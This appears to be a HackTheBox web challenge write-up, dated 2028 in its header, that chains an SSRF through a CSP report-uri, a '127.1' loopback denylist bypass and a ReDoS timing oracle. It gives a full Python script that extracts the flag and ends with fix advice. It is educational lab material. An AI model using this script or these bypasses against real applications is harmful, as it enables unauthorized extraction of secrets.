---
layout: post
title: "ExpressionalRebel"
date: 2028-01-08 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ssrf, redos, regex, timing-oracle, nodejs]
---

## Overview

ExpressionalRebel is a Medium **Web** challenge built on Node/Express. A "deactivate"
page hides an oracle that matches an attacker-supplied regex against the flag, but the
page is reachable only from localhost. The solve chains three ideas: a
[Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html) through a
CSP `report-uri` fetch, a loopback filter bypass using the abbreviated IPv4 `127.1`, and a
[ReDoS](https://cwe.mitre.org/data/definitions/1333.html) timing side channel to read the
flag one character at a time.

## The technique

Three moving parts in the source:

1. **The oracle** (`utils/index.js`) — attacker input is compiled as a regex and matched
   against the secret:
   ```js
   const regExp = require('time-limited-regular-expressions')({ limit: 2 });
   const validateSecret = async (secret) =>
       !!(await regExp.match(secret, env.FLAG));   // YOUR input is the PATTERN, FLAG is the subject
   ```
2. **The gate** (`middleware/isLocal.middleware.js`) — the oracle route is localhost-only:
   ```js
   if (req.socket.remoteAddress === '127.0.0.1' && req.header('host') === '127.0.0.1:1337') next();
   ```
3. **The SSRF** (`utils/index.js`) — the CSP `report-uri` you POST to `/api/evaluate` is
   fetched with `http.get(uri)`, guarded only by a string denylist on
   `url.parse(uri).hostname` against `["localhost","127.0.0.1"]`.

The bypass that makes it click is a parser discrepancy:

```js
url.parse('http://127.1:1337/deactivate').hostname  // => "127.1"  (NOT in the denylist)
http.get('http://127.1:1337/deactivate')            // server receives  Host: 127.0.0.1:1337
```

`url.parse` keeps the abbreviated `127.1`, so the denylist misses it, but Node's `http.get`
normalizes the IPv4 and sends `Host: 127.0.0.1:1337` — satisfying the strict `isLocal`
check exactly. One string, two interpretations.

## Solution

The SSRF never reflects the `/deactivate` body, so the success banner is invisible.
Instead, weaponize the 2-second regex time limit as a timing oracle. The pattern
`^<known><candidate>|(?:[^<]+)+>` matches instantly (via the anchored left alternative)
when `<candidate>` is the next flag character; otherwise the engine falls to the nested
quantifier on the right, which backtracks catastrophically on a flag containing no `>` and
burns until the 2s cap. A correct guess answers in ~0.4s; a wrong one in ~2.4s.

```python
import requests, time, urllib.parse, re

BASE = "http://TARGET:PORT"
EVIL = r"(?:[^<]+)+>"
THRESHOLD = 1.2
CHARSET = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!?#$%&*+-.:;/@^~<>()[]|= ")

def fast(known, subset):
    alt = "(?:" + "|".join(re.escape(c) for c in subset) + ")"
    pat = "^" + re.escape(known) + alt + "|" + EVIL
    csp = "report-uri http://127.1:1337/deactivate?secretCode=" + urllib.parse.quote(pat, safe="")
    t0 = time.time()
    requests.post(BASE + "/api/evaluate", data={"csp": csp}, timeout=25)
    return time.time() - t0 < THRESHOLD

def next_char(known):
    cands = CHARSET[:]
    while len(cands) > 1:                       # binary-search ~7 probes/char
        mid = len(cands) // 2
        cands = cands[:mid] if fast(known, cands[:mid]) else cands[mid:]
    return cands[0] if fast(known, cands) else None

known = "HTB{"
while not known.endswith("}"):
    c = next_char(known)
    if c is None: break
    known += c
    print(known)
```

Running it recovers the flag character by character:

```console
$ python3 solve.py
HTB{b
HTB{b4
...
HTB{...}
```

## Why it worked

Two independent gifts: a regex engine that runs attacker patterns against a secret, and a
URL parser (`url.parse`) that disagrees with the connector (`http.get`) about the host.
Squaring neither is needed — the timing gap between "left alternative short-circuits" and
"right alternative backtracks to the cap" is the entire leak.

## Fix / defense

- **SSRF filter:** never denylist hostnames as strings. Resolve the address and block the
  whole loopback/private range (127.0.0.0/8, ::1, RFC1918), comparing the *resolved* IP.
- **Oracle:** never compile user input into a regex to match against a secret; a boolean
  or timing result over a secret is itself a leak.
- **ReDoS:** a per-match time limit does not remove the vulnerability — it *becomes* the
  oracle. Use a linear-time engine such as RE2 instead of time-boxing a backtracking one.
